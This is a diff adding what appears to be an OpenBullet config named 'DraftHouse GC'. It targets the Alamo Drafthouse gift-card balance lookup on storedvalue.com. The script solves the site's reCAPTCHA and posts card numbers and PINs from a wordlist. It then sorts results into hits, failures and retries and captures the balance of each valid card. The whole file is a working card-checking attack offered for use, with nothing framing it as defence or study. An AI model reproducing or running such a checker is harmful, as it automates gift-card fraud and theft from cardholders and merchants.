@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "DraftHouse GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-20T11:27:37.6958144+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://wbiprod.storedvalue.com/WBI/clientPages/ADCGC_en_Lookup.jsp?language=en&host=drafthouse.com" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "accept-language: en-US;q=0.8,en;q=0.7" 
+RECAPTCHA "https://wbiprod.storedvalue.com/WBI/clientPages/ADCGC_en_Lookup.jsp?language=en&host=drafthouse.com" "6LckryETAAAAAPFZhVfos9Ays4NSWb_7POn1-Y-u" -> VAR "RECAP" 
+#hidCaptchaID PARSE "<SOURCE>" CSS "[name=hidCaptchaID]" "value" 0 -> VAR "hidCaptchaID" "" "" 
+#JSESSIONID PARSE "<COOKIES(JSESSIONID)>" LR "" "" Recursive=FALSE -> VAR "JSESSIONID" "" "" 
+#TIME FUNCTION CurrentUnixTime "" -> VAR "TIME" 
+#POST REQUEST POST "https://wbiprod.storedvalue.com/WBI/WBServlet" AutoRedirect=TRUE 
+  CONTENT "valueListCounter=4&0=N&1=19&2=16&3=14&resultPage=%2FclientPages%2FADCGC_en_Results.jsp&lookUpPage=%2FclientPages%2FADCGC_en_Lookup.jsp&errorPage=%2FclientPages%2FADCGC_en_500.jsp&host=drafthouse.com&lowerTime=<TIME>&PassedCaptchaNew=false&PinRequired=null&hidCaptchaID=<hidCaptchaID>&cardNoH=<USER>&PassedCaptchaNew=false&pinNoH=<PASS>&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: JSESSIONID=<JSESSIONID>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US;q=0.8,en;q=0.7" 
+  HEADER "Origin: https://wbiprod.storedvalue.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "The current balance is" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid information entered. Please try again." 
+  KEYCHAIN Retry OR 
+    KEY "The server encountered an unexpected condition" 
+PARSE "<SOURCE>" LR "<p class=\"balance\">The current balance is :&nbsp;" "</p>" Recursive=FALSE -> CAP "BALANCE" "" "" 
